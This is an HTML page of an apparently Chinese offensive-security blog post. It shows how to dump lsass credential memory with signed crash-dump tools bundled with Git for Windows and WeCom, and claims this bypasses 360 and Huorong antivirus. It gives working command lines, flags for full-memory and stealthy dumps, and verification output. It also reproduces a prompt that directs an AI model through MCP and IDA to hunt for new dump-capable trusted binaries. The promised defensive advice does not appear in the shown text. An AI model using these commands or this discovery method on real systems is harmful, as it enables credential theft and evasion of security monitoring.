@@ -1,0 +1,827 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一句话摘要：程序崩溃时，Windows 会派专门的”白名单程序”去转储内存用于分析。那我们能不能借这些厂商白名单工具的壳，干一件”不合法”的 lsass 转储？本文用 AI + MCP 快速筛出两个不在 LOLBAS 收录的可信程序（Git for Windows 与企业微信各一个），并在 360 核晶 + 火绒环境下验证通过。附完整思路与防御建议。   一、前言：倦怠与契机过去很长一段时间，主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LOLBins ：借崩溃转储白名单程序，绕过 360 核晶 和火绒拿下 lsass">
+<meta property="og:url" content="http://example.com/2026/08/15/LOLBins-%EF%BC%9A%E5%80%9F%E5%B4%A9%E6%BA%83%E8%BD%AC%E5%82%A8%E7%99%BD%E5%90%8D%E5%8D%95%E7%A8%8B%E5%BA%8F%EF%BC%8C%E7%BB%95%E8%BF%87-360-%E6%A0%B8%E6%99%B6-%E5%92%8C%E7%81%AB%E7%BB%92%E6%8B%BF%E4%B8%8B-lsass/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一句话摘要：程序崩溃时，Windows 会派专门的”白名单程序”去转储内存用于分析。那我们能不能借这些厂商白名单工具的壳，干一件”不合法”的 lsass 转储？本文用 AI + MCP 快速筛出两个不在 LOLBAS 收录的可信程序（Git for Windows 与企业微信各一个），并在 360 核晶 + 火绒环境下验证通过。附完整思路与防御建议。   一、前言：倦怠与契机过去很长一段时间，主">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151202157.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151203005.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151206037.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151207268.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151209089.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151208707.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151208275.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151219667.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151244650.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151221946.png">
+<meta property="article:published_time" content="2026-08-15T05:02:43.000Z">
+<meta property="article:modified_time" content="2026-08-15T05:04:44.713Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151202157.png">
+  
+  
+  
+  <title>LOLBins ：借崩溃转储白名单程序，绕过 360 核晶 和火绒拿下 lsass - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>yawataa</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/sun.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="LOLBins ：借崩溃转储白名单程序，绕过 360 核晶 和火绒拿下 lsass"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-08-15 13:02" pubdate>
+          August 15, 2026 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">LOLBins ：借崩溃转储白名单程序，绕过 360 核晶 和火绒拿下 lsass</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>一句话摘要：程序崩溃时，Windows 会派专门的”白名单程序”去转储内存用于分析。那我们能不能借这些厂商白名单工具的壳，干一件”不合法”的 lsass 转储？本文用 AI + MCP 快速筛出两个<strong>不在 LOLBAS 收录</strong>的可信程序（Git for Windows 与企业微信各一个），并在 360 核晶 + 火绒环境下验证通过。附完整思路与防御建议。</p>
+</blockquote>
+<hr>
+<h2 id="一、前言：倦怠与契机"><a href="#一、前言：倦怠与契机" class="headerlink" title="一、前言：倦怠与契机"></a>一、前言：倦怠与契机</h2><p>过去很长一段时间，主播都在实习单位”享受生活”。不得不说，现在的实习公司是真的悠闲，氛围也好——安逸到让主播一度陷入了疲懒状态，躺平了挺久，不太想动笔。</p>
+<p>说到底是有点”无话可写”。安全圈子里的内容大差不差，翻来覆去总觉得是在搬运别人的东西，写出来没什么增量，自然也就没了动力。</p>
+<p>不过，疲懒归疲懒，手上的活其实一直没停过。比如主播自研的 Beacon，能稳定绕过哨兵（Sentinel）和 Elastic 的检测——这也算主播为数不多引以为傲的成果了。只是技术学习确实落下了，回头一算，大概有两周没认认真真研究过一篇技术文章了。</p>
+<p>这次研究的起因，是好兄弟遇到了一个真实场景：<strong>需要转储（dump）lsass</strong>。主播平时疏于学习、才疏学浅，当时也没帮上什么忙（倒是 dump SAM 还有一些手法）。正好今天有空，干脆沉下心好好研究一番。</p>
+<hr>
+<h2 id="二、LOLBins-与-lsass-转储：先补课"><a href="#二、LOLBins-与-lsass-转储：先补课" class="headerlink" title="二、LOLBins 与 lsass 转储：先补课"></a>二、LOLBins 与 lsass 转储：先补课</h2><h3 id="2-1-转储-lsass-的常规套路"><a href="#2-1-转储-lsass-的常规套路" class="headerlink" title="2.1 转储 lsass 的常规套路"></a>2.1 转储 lsass 的常规套路</h3><p>转储 lsass 的技术其实已经积累了不少，简单罗列：</p>
+<ul>
+<li>崩溃转储（Crash Dump）</li>
+<li>MiniDump 系列</li>
+<li>上驱动（内核层直接读内存）</li>
+<li>……</li>
+</ul>
+<p>奇安信攻防社区有一篇不错的汇总文，值得一读：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mdr.skyeye.qianxin.com/forum/share/2434">奇安信攻防社区 - Windows lsass 转储篇</a></p>
+</blockquote>
+<p>文中提到的白名单工具主要有这几类：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">Procdump.exe<br>SQLDumper.exe<br>createdump.exe<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>Procdump.exe</code> 和 <code>SQLDumper.exe</code> 大家想必已经耳熟能详，是老演员了。这类”白名单程序”在 LOLBAS 收录网站里也能搜到一大堆：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS 项目</a></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151202157.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-2-一个值得深挖的问题：这些程序为什么会存在？"><a href="#2-2-一个值得深挖的问题：这些程序为什么会存在？" class="headerlink" title="2.2 一个值得深挖的问题：这些程序为什么会存在？"></a>2.2 一个值得深挖的问题：这些程序为什么会存在？</h3><p>相比”怎么用”，我更想先问一句：<strong>为什么会有这些程序？</strong></p>
+<p>答案在崩溃处理机制里。当程序崩溃时，Windows 需要专门的进程来”善后”——把崩溃进程的内存（dmp 文件）转储下来，回传给厂商&#x2F;开发者分析，定位崩溃原因。</p>
+<p>这是 Windows 生态里非常成熟的一套流程，核心就是 <strong>Windows 错误报告（WER, Windows Error Reporting）</strong>：</p>
+<ol>
+<li>程序异常崩溃 → 触发 WER</li>
+<li>系统派出专门的处理进程（如 <code>WerFault.exe</code>）接管</li>
+<li>按配置把进程内存写入 <code>.dmp</code> 文件</li>
+<li>开发者拿回 dmp，用调试器还原现场、修 Bug</li>
+</ol>
+<p>所以，在我们的个人电脑上，其实能看到大量这样的 dmp 文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151203005.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2-3-思路落地：把”合法的崩溃处理程序”变成”攻击者”"><a href="#2-3-思路落地：把”合法的崩溃处理程序”变成”攻击者”" class="headerlink" title="2.3 思路落地：把”合法的崩溃处理程序”变成”攻击者”"></a>2.3 思路落地：把”合法的崩溃处理程序”变成”攻击者”</h3><p>核心思路到这里就很清晰了：</p>
+<blockquote>
+<p><strong>既然系统本身信任这些专门用来转储崩溃进程内存的程序，那我们为什么不借它们的壳，来完成一次”不合法”的 lsass 转储？</strong></p>
+</blockquote>
+<p>这就是 LOLBins 的本质——借用微软（或各大厂商）自己的白名单工具，干白名单之外的活。因为这些程序自带可信数字签名，被各家杀软、EDR 视为”亲儿子”，天然绕过了大量基于签名的检测。</p>
+<p>同理，lsass 作为一个常驻高权限进程，恰好也有被”转储”的价值（里面躺着不少好东西）。一个敢读，一个能读，中间的桥就是这些白名单工具。</p>
+<hr>
+<h2 id="三、AI-加持：用-MCP-把筛选变成流水线"><a href="#三、AI-加持：用-MCP-把筛选变成流水线" class="headerlink" title="三、AI 加持：用 MCP 把筛选变成流水线"></a>三、AI 加持：用 MCP 把筛选变成流水线</h2><h3 id="3-1-为什么需要-AI"><a href="#3-1-为什么需要-AI" class="headerlink" title="3.1 为什么需要 AI"></a>3.1 为什么需要 AI</h3><p>海量的白名单程序，一个个手工去翻导入表、查文档、验证利用方式，显然不现实。AI 在这里可以充当一个**非常高效的”快速筛选器”**。</p>
+<p>方法很简单：给 AI 一个清晰、聚焦的提示词，再配上 <strong>MCP（Model Context Protocol）</strong>——让模型直接驱动二进制分析工具，把”加载样本 → 静态分析 → 梳理调用链”这一串动作交给工具链完成，AI 负责推理和汇总。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151206037.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="3-2-提示词原文：把方法论直接写进需求"><a href="#3-2-提示词原文：把方法论直接写进需求" class="headerlink" title="3.2 提示词原文：把方法论直接写进需求"></a>3.2 提示词原文：把方法论直接写进需求</h3><p>很多人用 AI 是”随口问一句”，但真正好用的提示词，<strong>本身就是一份完整的挖掘方法论</strong>。主播当时给的提示词长这样：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs text">【目标】在本机挖掘一个尚未被广泛记录的 LOLBin（exe 或 DLL），它能转储任意进程的内存成 .dmp，<br>可用来 dump lsass。已知的（SqlDumper / rundll32+comsvcs / werfault / taskmgr / procdump）全部排除。<br><br>【核心思路】不靠猜名字，用「特征扫描 → 逆向筛选 → 实测验证」三条流水线，<br>把「潜在转储程序」从全盘几万文件里筛到 1~3 个。<br><br>Phase 1 · 特征扫描（一次性全自动）<br>- 遍历所有盘符下所有 PE（.exe + .dll + .scr），筛两个硬信号：<br>  · 信号 A（导入）：导入了 MiniDumpWriteDump（dbghelp.dll）或任何含 dump 字样的 API —— 说明它内部会写 dump<br>  · 信号 B（导出）：DLL 导出了名字含 dump/dmp/minidump 的函数 —— 说明可被 rundll32 &lt;dll&gt;,&lt;func&gt; 拉起转储（就是 comsvcs.dll 那类）<br>  · 排除噪声目录（WinSxS / Installer / WindowsApps / Recycle Bin…）<br>- 产出：候选短名单（几百 → 几十个）<br><br>Phase 2 · 逆向筛选（idalib-mcp 逐个加载）<br>- 对短名单批量 load_binary + 反编译，逐项过三关：<br>  1. 真的调用 MiniDumpWriteDump / 自带转储逻辑？（不是名字带 dump 的巧合）<br>  2. 目标进程是外部可控 PID，还是只能 dump 自己？（关键区分点）<br>  3. 输出路径/文件名可控吗？<br>- 剔除只能 dump 自身、参数写死、无 SeDebugPrivilege 的<br>- 产出：锁定 1~3 个「疑似全新」候选<br><br>Phase 3 · 实测验证<br>- 从逆向结果还原调用语法（PID 参数位置、输出路径、所需权限）<br>- 对 lsass 真实执行转储<br>- 校验产物：文件头魔数 MDMP (0x504D444D)、大小合理<br><br>Phase 4 · 确认&quot;新&quot; + 归档<br>- 与已知 LOLBin 清单比对，确认未记录过<br>- 输出报告：二进制路径、调用命令、产物证据（IDA 地址 + dump 文件头）<br><br>【交付物】一个全新可用的 dump 型 LOLBin + 完整调用方法 + 逆向/实测证据。<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-3-四阶段流水线是怎么跑的"><a href="#3-3-四阶段流水线是怎么跑的" class="headerlink" title="3.3 四阶段流水线是怎么跑的"></a>3.3 四阶段流水线是怎么跑的</h3><ol>
+<li><strong>特征扫描</strong>：脚本遍历 4 个盘符、扫了 <strong>161,787 个 PE</strong>，用三条通道收窄——导入了 <code>MiniDumpWriteDump</code> 等 dump 类 API（说明内部会写 dump）、DLL 导出了名字含 dump&#x2F;dmp 的函数（说明可被 <code>rundll32 &lt;dll&gt;,&lt;func&gt;</code> 拉起转储，就是 comsvcs.dll 那一类），以及最关键的一条：**<code>MiniDumpWriteDump + OpenProcess + atoi/strtol</code> 三者同现**（命令行可控 PID 的转储器特征）。排除 WinSxS &#x2F; Installer &#x2F; WindowsApps 等噪声目录后，全盘 16 万文件筛到候选 <strong>6,738</strong> 个，其中命中组合信号的仅 <strong>276</strong> 个。</li>
+<li><strong>逆向筛选</strong>：短名单用 idalib-mcp 批量 <code>load_binary</code> + 反编译，逐项过三关——是否真的调用 <code>MiniDumpWriteDump</code>、目标 PID 是否外部可控（还是只能 dump 自己）、输出路径&#x2F;文件名是否可控，再剔除参数写死、无 SeDebugPrivilege 的。</li>
+<li><strong>实测验证</strong>：从逆向结果还原调用语法（PID 参数位置、输出路径、所需权限），对 lsass 真实转储，校验 dmp 文件头魔数 <code>MDMP</code>（0x504D444D）、大小合理。</li>
+<li><strong>确认 + 归档</strong>：与已知 LOLBin 清单比对，确认”新”，输出完整报告（二进制路径、调用命令、IDA 地址 + dump 文件头证据）。</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151207268.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h2 id="四、初步产出：minidumper-与-minidump64"><a href="#四、初步产出：minidumper-与-minidump64" class="headerlink" title="四、初步产出：minidumper 与 minidump64"></a>四、初步产出：minidumper 与 minidump64</h2><p>因为前面只让 AI 挖掘 1-3 个候选，本来不抱太大期望——没想到还真有收获，最后锁定了两个：<strong>Git for Windows 自带的 <code>minidumper.exe</code></strong> 和**企业微信自带的 <code>minidump64.exe</code>**。两个都不在 LOLBAS 官方收录名单里。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151209089.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151208707.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151208275.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="4-1-候选一：minidumper-exe-——-Git-自带的全内存转储器-🏆"><a href="#4-1-候选一：minidumper-exe-——-Git-自带的全内存转储器-🏆" class="headerlink" title="4.1 候选一：minidumper.exe —— Git 自带的全内存转储器 🏆"></a>4.1 候选一：minidumper.exe —— Git 自带的全内存转储器 🏆</h3><table>
+<thead>
+<tr>
+<th>项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>路径</td>
+<td><code>C:\Program Files\Git\usr\bin\minidumper.exe</code>（Git for Windows 标准安装自带，MSYS2&#x2F;Cygwin）</td>
+</tr>
+<tr>
+<td>签名</td>
+<td>Git（MSYS2）&#x2F; Cygwin</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>x64</td>
+</tr>
+<tr>
+<td>LOLBAS</td>
+<td><strong>未收录</strong>（官方清单 241 个去重条目 diff 确认）</td>
+</tr>
+<tr>
+<td>用法</td>
+<td><code>minidumper.exe [-t &lt;type&gt;] [-n] &lt;FILENAME&gt; &lt;PID&gt;</code>，产物固定为 <code>&lt;FILENAME&gt;.dmp</code></td>
+</tr>
+</tbody></table>
+<p>两个关键参数直接决定了它的价值：</p>
+<ul>
+<li><strong><code>-t &lt;type&gt;</code><strong>：转储类型标志，</strong><code>-t 0x2</code> &#x3D; MiniDumpWithFullMemory（全内存）</strong>——这正是离线提取凭据最需要的形态；<code>-t 0</code> 则是轻量转储，还能组合（如 <code>-t 0x2f</code>）</li>
+<li><strong><code>-n</code><strong>：</strong>不终止目标进程</strong>。不加这个参数的话，转储完成会把目标进程直接 Terminate 掉——对”悄悄转储”的场景来说，这参数几乎必须带上</li>
+</ul>
+<p>对 lsass（PID 1468）实测全内存转储：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">minidumper.exe -n -t 0x2 lsass_gitmd 1468<br>→ 生成 lsass_gitmd.dmp，70,837,325 字节（约 70MB）<br>→ 魔数 &#x27;MDMP&#x27; ✓<br>→ Flags = 0x220002（含 MiniDumpWithFullMemory=0x2）✓<br>→ 流目录含 Memory64List（全内存区域）✓<br>→ dump 前 20MB 内含 &#x27;lsass&#x27; / &#x27;LSA&#x27; 字符串（确为 lsass 内存）✓<br>→ 转储完成后 lsass 仍存活（PID 1468，-n 生效未杀进程）✓<br></code></pre></td></tr></table></figure>
+
+<p>对 notepad 的全内存转储（86MB）同样验证通过；cmd &#x2F; PowerShell &#x2F; Git Bash 里都能调用，相对路径也可以。</p>
+<blockquote>
+<p>一个值得注意的细节：<code>minidumper.exe</code> 内部**并不调用 <code>AdjustTokenPrivileges</code>**，权限完全依赖调用者自身的 token。实测从提权后的管理员会话可以转储 lsass（前提是目标 <code>RunAsPPL=0</code>，lsass 未被 PPL 保护）。</p>
+</blockquote>
+<h3 id="4-2-候选二：minidump64-exe-——-企业微信自带的轻量转储器"><a href="#4-2-候选二：minidump64-exe-——-企业微信自带的轻量转储器" class="headerlink" title="4.2 候选二：minidump64.exe —— 企业微信自带的轻量转储器"></a>4.2 候选二：minidump64.exe —— 企业微信自带的轻量转储器</h3><table>
+<thead>
+<tr>
+<th>项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>路径</td>
+<td><code>D:\wxwork\WXWork\5.0.6.6018\minidump64.exe</code>（企业微信安装目录）</td>
+</tr>
+<tr>
+<td>签名</td>
+<td>Tencent Technology (Shenzhen) Company Limited</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>x64</td>
+</tr>
+<tr>
+<td>LOLBAS</td>
+<td><strong>未收录</strong></td>
+</tr>
+<tr>
+<td>用法</td>
+<td><code>minidump64.exe &lt;PID&gt; &lt;输出路径&gt;</code>（恰好 2 个参数，第二个参数直接就是 dmp 完整路径）</td>
+</tr>
+</tbody></table>
+<p>对 lsass 实测转储：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">minidump64.exe 1468 C:\...\lsass_md64.dmp<br>→ 83,398 字节，魔数 &#x27;MDMP&#x27; ✓<br>→ Flags = 0x200000，流目录仅 ThreadList / ModuleList / MemoryList（小）<br></code></pre></td></tr></table></figure>
+
+<p>逆向证据（idalib）把它的调用链还原得清清楚楚：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">WinMain @0x140001470<br>  → CommandLineToArgvW（恰好 2 参）<br>  → argv[0] = PID（wcstol）<br>  → argv[1] = 输出路径<br>  → OpenProcess(0x1FFFFF /* PROCESS_ALL_ACCESS */, 0, PID)<br>  → CreateFileW(CREATE_ALWAYS)<br>  → MiniDumpWriteDump(hProcess, PID, hFile, 0, 0, 0, 0)<br></code></pre></td></tr></table></figure>
+
+<p>顺带一提：同目录还有一个 x86 版 <code>minidump.exe</code>，代码逻辑完全相同，但<strong>本机的 32 位 dump 栈会输出 0 字节</strong>（详见第五章”本机特性”），所以 <code>minidump64.exe</code> 才是真正可用的那个。</p>
+<blockquote>
+<p>诚实声明：<code>minidump64.exe</code> 用的是 <code>MiniDumpNormal</code>（轻量转储），<strong>不含完整堆内存，不适合直接做凭据提取</strong>。它的价值更多在于”能转储任意进程（含 lsass）、签名可信、常驻目标机器”——实用性上不如候选一。</p>
+</blockquote>
+<h3 id="4-3-为什么这两个值得关注"><a href="#4-3-为什么这两个值得关注" class="headerlink" title="4.3 为什么这两个值得关注"></a>4.3 为什么这两个值得关注</h3><p>抛开具体实现，这两个程序有共性价值：</p>
+<ul>
+<li><strong>可信签名</strong>：一个 Git&#x2F;MSYS2、一个腾讯，都是”名声在外”的白名单，签名信任链完整</li>
+<li><strong>能力匹配</strong>：本身就是厂商为崩溃处理&#x2F;转储打造的，能力天然对口</li>
+<li><strong>默认存在</strong>：装过 Git 的内网、装过企业微信的办公机器上大概率都在，不需要额外投放工具，隐蔽性拉满</li>
+<li><strong>不在 LOLBAS</strong>：主流检测规则与 HIT 列表基本都没覆盖，属于真正的”漏网之鱼”</li>
+</ul>
+<blockquote>
+<p>顺带记录几个”接近成功”的降级候选：Firefox 的 <code>crashhelper.exe</code>（确实调用 MiniDumpWriteDump，但输出句柄需要继承、外部难控制）、飞书的 <code>lark_crashpad.dll</code>（需预先初始化 crashpad 全局 handler）、钉钉的 <code>CrashDumper.exe</code>（INI 驱动，只针对钉钉自身崩溃场景）。它们都在 Phase 2 被筛掉，但说明这类思路的覆盖面比想象中大得多。</p>
+</blockquote>
+<hr>
+<h2 id="五、实战验证：两个工具的真实效果"><a href="#五、实战验证：两个工具的真实效果" class="headerlink" title="五、实战验证：两个工具的真实效果"></a>五、实战验证：两个工具的真实效果</h2><p>先交代目标环境：</p>
+<ul>
+<li><strong>权限</strong>：管理员高完整性（High IL）</li>
+<li><strong>PPL</strong>：<code>RunAsPPL = 0</code>，lsass 无 PPL 保护</li>
+<li><strong>杀软</strong>：360 核晶 +火绒（测试目标环境）</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151219667.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151244650.png" srcset="/img/loading.gif" lazyload alt="image-20260815124435516"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202608151221946.png" srcset="/img/loading.gif" lazyload></p>
